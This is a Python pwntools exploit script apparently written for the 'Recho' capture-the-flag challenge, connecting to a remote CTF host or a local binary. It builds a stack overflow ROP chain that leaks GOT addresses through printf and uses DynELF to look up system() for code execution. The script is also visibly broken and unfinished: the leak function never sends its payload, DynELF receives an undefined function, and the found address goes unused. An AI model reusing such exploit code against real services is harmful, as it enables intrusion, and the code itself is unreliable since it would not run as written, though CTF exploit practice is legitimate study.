# coding:utf-8
from pwn import *
import time, sys


run_argv = []
# local process envirnoment
# socat tcp-listen:22333,reuseaddr,fork system:./Recho
LOCAL = True
elf_name = "./Recho"

#retmote args
# remote_host = "127.0.0.1"
#
remote_host = "recho.2017.teamrois.cn"
remote_port = 9527

elf = ELF(elf_name)
#context.clear(arch="i386")
context.clear(arch="amd64")

if LOCAL:
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    context.log_level = "debug"
    io = remote(remote_host, remote_port)

def msend_str(length, mstring):
    io.send(str(length))
    time.sleep(0.05)
    io.send(mstring)
    time.sleep(0.05)

def leak(lk_addr):
    global io
    payload = 'a'*(0x30) + p64(0x400791)
    payload += p64(0x00000000004008a3)      # pop rdi; ret
    payload += p64(lk_addr)
    payload += p64(elf.plt['printf'])
    payload += p64(0x400791)                # main
    io.shutdown()
    io = io.connect_input(io)
    data = io.recvuntil("Welcome to Recho server!\n")[:-25]
    return data

def s_exp():
    io.recvuntil("Welcome to Recho server!\n")
    pause()
    write_addr = u64(leak(elf.got['write']).ljust(8, chr(0)))
    log.info("write_addr is: "+hex(write_addr))
    write_addr = u64(leak(elf.got['write']).ljust(8, chr(0)))
    d = DynELF(s_leak, write_addr)
    system_addr = d.lookup('system')

if __name__ == "__main__":
    log.info("process:"+str(io))
    s_exp()
    pause()
